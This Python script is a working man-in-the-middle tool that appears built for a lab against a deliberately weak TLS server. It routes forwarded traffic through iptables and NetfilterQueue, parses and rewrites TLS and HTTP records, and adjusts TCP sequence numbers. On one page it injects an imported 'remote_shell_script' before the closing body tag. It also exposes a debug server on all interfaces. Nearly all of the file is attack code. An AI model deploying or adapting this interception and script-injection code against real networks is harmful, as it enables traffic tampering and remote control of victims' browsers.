# -*- coding: utf-8 -*-

import subprocess
from netfilterqueue import NetfilterQueue
import scapy.all as scapy
from utils import *
import tls
from remote_shell_helper import *
import ptvsd
import socket

tls_only_log_bytes = False

connections = {}
def handle_packet(packet):
    global connections
    pkt_scapy = scapy.IP(packet.get_payload())
    if (pkt_scapy.haslayer(scapy.TCP)):
        tcp = pkt_scapy[scapy.TCP]
        already_manipulated_tcp_seq_ack = False
        tcp_data = b""
        if (tcp.dport == 443 or tcp.dport == 80):
            connection_id = (pkt_scapy.src, tcp.sport)
        else:
            connection_id = (pkt_scapy.dst, tcp.dport)
        if (connection_id in connections):
            ctx = connections[connection_id]
        else:
            ctx = tls.Context()
            connections[connection_id] = ctx

        if ((tcp.sport == 443 or tcp.dport == 443) and tcp.payload and hasattr(tcp.payload, "load")):
            tcp_data = tcp.payload.load
            print("SEQ="+str(tcp.seq), "ACK="+str(tcp.ack),
                "Ports:", tcp.sport, "->", tcp.dport, "len:", len(tcp_data))
            #print(bytestring_to_hex(tcp_data))
            if ((tcp.sport == 443 and ctx.server_seq >= tcp.seq) or (tcp.dport == 443 and ctx.client_seq >= tcp.seq)):
                # TODO: maybe manipulate again (for case of packet loss)? might need to consider shift by seq_diff
                print("DROP")
                packet.drop()
                return

            if (tls_only_log_bytes):
                tls_records = []
            elif (ctx.tmp_incomplete_tls_record != None):
                tls_records = tls.parse_tls_records(ctx, ctx.tmp_incomplete_tls_record["msg"] + tcp_data, tcp.sport == 443)
                ctx.tmp_incomplete_tls_record = None
                if (len(tls_records) > 0 and tls_records[-1]["complete"] == False):
                    ctx.tmp_incomplete_tls_record = tls_records[-1]
            else:
                tls_records = tls.parse_tls_records(ctx, tcp_data, tcp.sport == 443)
                if (len(tls_records) > 0 and tls_records[-1]["complete"] == False):
                    ctx.tmp_incomplete_tls_record = tls_records[-1]
            
            if (len(tls_records) == 0):
                tls_records = None
                print(bytestring_to_hex(tcp_data))

            if (tcp.sport == 443):
                ctx.server_seq = tcp.seq
            else:
                ctx.client_seq = tcp.seq

            if (tls_records):
                manipulated, manipulated_tls_records, server_closed, client_closed = tls.manipulate_tls_records(ctx, tls_records, lambda d: replace_tls_content(ctx, d, tcp.sport == 443))
                if (manipulated):
                    new_packet = b"".join(manipulated_tls_records)
                    seq_diff = ctx.server_seq_diff if tcp.sport == 443 else ctx.client_seq_diff
                    ack_diff = ctx.client_seq_diff if tcp.sport == 443 else ctx.server_seq_diff
                    replace_packet_payload(packet, new_packet, tcp.seq + seq_diff, tcp.ack - ack_diff)
                    already_manipulated_tcp_seq_ack = True
                    seq_diff = len(new_packet) - len(tcp_data)
                    if (tcp.sport == 443):
                        ctx.server_seq_diff += seq_diff
                    else:
                        ctx.client_seq_diff += seq_diff
                    if (len(new_packet) == 0):
                        #print("Dropping (incomplete) packet")
                        packet.drop()
                        return
                    #print("Sending manipulated message", len(new_packet))
                if (server_closed):
                    ctx.server_seq = 0
                    if (ctx.client_seq == 0):
                        ctx.server_seq_diff = 0
                        ctx.client_seq_diff = 0
                if (client_closed):
                    ctx.client_seq = 0
                    if (ctx.server_seq == 0):
                        ctx.server_seq_diff = 0
                        ctx.client_seq_diff = 0

        elif (tcp.sport == 80 and tcp.payload and hasattr(tcp.payload, "load")):
            tcp_data = tcp.payload.load
            print("SEQ="+str(tcp.seq), "ACK="+str(tcp.ack),
                "Ports:", tcp.sport, "->", tcp.dport)
            print_binary_data(tcp_data, "", "cyan")
            ctx.server_seq = tcp.seq

            if (ctx.requested_url == "/" and b"\r\n\r\n" in tcp_data):
                http_payload = tcp_data.split(b"\r\n\r\n", 1)[1]
                new_http_payload = http_payload.replace(b"nginx", b"ng111nx")
                seq_diff = ctx.server_seq_diff if tcp.sport == 80 else ctx.client_seq_diff
                ack_diff = ctx.client_seq_diff if tcp.sport == 80 else ctx.server_seq_diff
                replace_packet_payload(packet, tcp_data[:-len(http_payload)].replace(b"\r\nContent-Length: " + str(len(http_payload)).encode() + b"\r\n", b"\r\nContent-Length: " + str(len(new_http_payload)).encode() + b"\r\n") + new_http_payload,
                                        tcp.seq + seq_diff, tcp.ack - ack_diff)
                already_manipulated_tcp_seq_ack = True
                seq_diff = len(new_http_payload) - len(http_payload)
                if (tcp.sport == 80):
                    ctx.server_seq_diff += seq_diff
                else:
                    ctx.client_seq_diff += seq_diff
        elif (tcp.dport == 80 and tcp.payload and hasattr(tcp.payload, "load")):
            tcp_data = tcp.payload.load
            print("SEQ="+str(tcp.seq), "ACK="+str(tcp.ack),
                "Ports:", tcp.sport, "->", tcp.dport)
            print_binary_data(tcp_data, "", "cyan")
            ctx.client_seq = tcp.seq

            if (tcp_data.startswith(b"GET ")):
                ctx.requested_url = tcp_data[4:].split()[0].decode()

        if (not already_manipulated_tcp_seq_ack):
            # only manipualte seq/ack
            seq_diff = ctx.server_seq_diff if (tcp.sport == 443 or tcp.sport == 80) else ctx.client_seq_diff
            ack_diff = ctx.client_seq_diff if (tcp.sport == 443 or tcp.sport == 80) else ctx.server_seq_diff
            if (tcp.ack == 0): ack_diff = 0
            replace_packet_payload(packet, tcp_data, tcp.seq + seq_diff, tcp.ack - ack_diff)

        print("")
    packet.accept()

MAX_TCP_PAYLOAD_LENGTH = 1448 # based on Ethernet max 1518 - 18 bytes Eth and 52 bytes IP/TCP header
def replace_packet_payload(nfq_packet, new_tcp_payload, new_tcp_seq=None, new_tcp_ack=None):
    def prepare_packet(new_tcp_payload, new_tcp_seq, new_tcp_ack):
        ip_packet = scapy.IP(nfq_packet.get_payload())
        del ip_packet.len
        del ip_packet.chksum
        del ip_packet[scapy.TCP].chksum

        tcp_fields = ip_packet[scapy.TCP].fields
        if (new_tcp_seq): tcp_fields["seq"] = new_tcp_seq
        if (new_tcp_ack): tcp_fields["ack"] = new_tcp_ack
        new_packet = scapy.IP(**ip_packet.fields)/scapy.TCP(**tcp_fields)
        new_packet.add_payload(new_tcp_payload)
        return new_packet

    if (len(new_tcp_payload) > MAX_TCP_PAYLOAD_LENGTH):
        # split into multiple tcp packets
        # send them (except last) manually and not by replacing
        while(len(new_tcp_payload) > MAX_TCP_PAYLOAD_LENGTH):
            payload_to_send_manually = new_tcp_payload[:MAX_TCP_PAYLOAD_LENGTH]
            packet_to_send_manually = prepare_packet(payload_to_send_manually, new_tcp_seq, new_tcp_ack)
            send_ip_packet(packet_to_send_manually.dst, bytes(packet_to_send_manually))
            new_tcp_payload = new_tcp_payload[MAX_TCP_PAYLOAD_LENGTH:]
            new_tcp_seq += MAX_TCP_PAYLOAD_LENGTH

    new_packet = prepare_packet(new_tcp_payload, new_tcp_seq, new_tcp_ack)
    nfq_packet.set_payload(bytes(new_packet))
    return nfq_packet

def send_ip_packet(dst, packet):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    s.sendto(packet, (dst, 0))

def replace_tls_content(ctx, data, from_server):
    print_binary_data(data, "received:", "yellow")
    if (from_server):
        is_http = data.startswith(b"HTTP/1.1")
        # extract http header if necessary
        if (is_http):
            payload = data.split(b"\r\n\r\n", 1)[1]
            http_header = data[:-len(payload)]
        else:
            payload = data

        # actual manipulation, independet of http or not
        new_payload = payload
        if (ctx.requested_url == "/"):
            new_payload = new_payload.replace(b"weak-server", b"Man in the middle server")
        elif (ctx.requested_url == "/counter.html"):
            new_payload = new_payload.replace(b"</body>", remote_shell_script + b"</body>")
        if (is_http):
            new_payload = new_payload.replace(b"Weak Server...", b"We can even manipulate http headers...")

        # modify http header if necessary
        if (is_http):
            new_http_header = http_header.replace(b"\r\nContent-Length: " + str(len(payload)).encode() + b"\r\n", b"\r\nContent-Length: " + str(len(new_payload)).encode() + b"\r\n")
            data = new_http_header + new_payload
        else:
            data = new_payload
    else:
        if (data.startswith(b"GET ")):
            ctx.requested_url = data[4:].split()[0].decode()
    #print_binary_data(data, "sent:    ", "green")
    return data

def print_binary_data(data, prefix="", color=None):
    color_codes = { "red": 31, "green": 32, "yellow": 33, "blue": 34, "magenta": 35, "cyan": 36 }
    color_escape_code = "" if color not in color_codes else "\x1b[" + str(color_codes[color]) + "m"
    color_escape_reset = "\x1b[0m"
    def is_printable(data):
        printable_chars = sum([int(20 <= c <= 126) for c in data])
        return printable_chars >= 0.8 * len(data)
    if (is_printable(data)):
        # replace all line breaks so that all lines are indented and colored (might otherwise be resetted for new line)
        # insert line break before data if there is a prefix (add always, but remove if not)
        indent = "\t"
        print(prefix + (b"\n" + data).decode().replace("\n", "\n" + indent + color_escape_code)[int(prefix == ""):] + color_escape_reset)
    else:
        print(prefix + color_escape_code, data, color_escape_reset)


def main():
    # Debug Server
    ptvsd.enable_attach(address=('0.0.0.0', 5678))
    nfqueue = NetfilterQueue()
    nfqueue.bind(1, handle_packet)
    try:
        nfqueue.run()
    except:
        pass
    nfqueue.unbind()

def pass_packets_to_nfqueue():
    command = "iptables -I FORWARD -j NFQUEUE --queue-num 1"
    subprocess.check_call(command.split())

pass_packets_to_nfqueue()
main()
